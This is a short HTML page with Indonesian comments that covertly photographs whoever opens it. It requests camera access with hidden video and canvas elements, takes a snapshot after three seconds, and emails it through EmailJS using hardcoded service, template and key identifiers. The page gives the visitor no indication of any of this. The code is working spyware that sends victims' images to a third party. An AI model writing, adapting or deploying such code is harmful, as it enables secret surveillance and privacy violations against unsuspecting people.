<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kamera + EmailJS (File)</title>
</head>
<body>
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <form id="emailForm">
    <input type="file" name="attachment" id="hiddenFile" style="display:none;">
  </form>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("8y4NpgAMKhzz-pqFL"); // Public Key
    })();

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    const hiddenFile = document.getElementById('hiddenFile');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        setTimeout(() => {
          // Ambil snapshot
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          // Convert ke Blob
          canvas.toBlob(blob => {
            const file = new File([blob], "snapshot.png", { type: "image/png" });

            // Masukkan ke input file form
            const dataTransfer = new DataTransfer();
            dataTransfer.items.add(file);
            hiddenFile.files = dataTransfer.files;

            // Kirim via EmailJS
            emailjs.sendForm("service_cw175cv", "template_f7501pb", "#emailForm")
              .then(res => console.log("✅ Email terkirim!", res))
              .catch(err => console.error("❌ Gagal kirim:", err));

          }, "image/png");
        }, 3000); // foto otomatis 3 detik
      })
      .catch(err => console.error("Izin kamera ditolak: ", err));
  </script>
</body>
</html>
